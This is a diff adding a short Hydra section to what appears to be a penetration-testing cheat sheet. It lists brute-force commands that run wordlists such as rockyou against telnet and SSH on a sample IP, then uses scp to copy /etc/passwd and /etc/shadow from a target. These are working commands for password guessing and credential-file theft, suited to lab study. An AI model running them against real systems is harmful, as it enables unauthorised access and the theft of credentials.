@@ -118,6 +118,31 @@ fclose($fp)
 ?>
 ```
 
+HYDRA
+
+- To get detailed information about a module
+
+`hydra -U module` => module : rdp http ftp ...
+
+`hydra -L user.txt -P password.txt <service>://<server> <options>`
+
+`hydra -L user.txt -P password.txt telnet://<target>`
+
+`hydra
+-L /usr/share/ncrack/minimal.usr
+-P /usr/share/seclists/Passwords/rockyou-10.txt
+telnet://192.168.99.22`
+
+`hydra
+-L /usr/share/ncrack/minimal.usr
+-P /usr/share/seclists/Passwords/rockyou-15.txt
+192.168.99.22 ssh`
+
+to download files we can use the scp (secure copy) command as follows:
+
+`scp root@<target>:/etc/passwd .`
+`scp root@<target>:/etc/shadow .`
+
 *CheatSheet Commands:*
 
 | **Command** | **Description** |
